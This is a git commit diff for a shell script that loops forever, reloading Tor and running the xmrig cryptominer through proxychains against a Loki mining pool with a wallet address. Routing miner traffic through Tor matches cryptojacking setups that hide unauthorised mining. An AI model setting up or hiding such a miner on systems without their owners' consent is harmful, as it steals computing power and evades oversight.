c87a872b13d6519576715d59eefef025cd0e47a2
slicommeo <46085992+slicommeo@users.noreply.github.com>
2019-10-11 05:05:19 +0000

    Update startloki.sh

--- startloki.sh
+++ startloki.sh
@@ -2,6 +2,6 @@
 while true
 do
   echo hello
-  sudo systemctl tor restart
+  sudo service tor reload
   proxychains ./xmrig xmrig.exe --donate-level 0 -o loki.pool.mine2gether.com:3331 -u LEQZ1J6ceePcWBaw19JgUCi7E3fV6VW9YGuH9LnvSvBtfnSMYhih3hQKUY9mV75zgwJ5EJqdDSSoKDT2L1bzJs6BU3jPgxq -p "test" -a rx/loki -k
 done
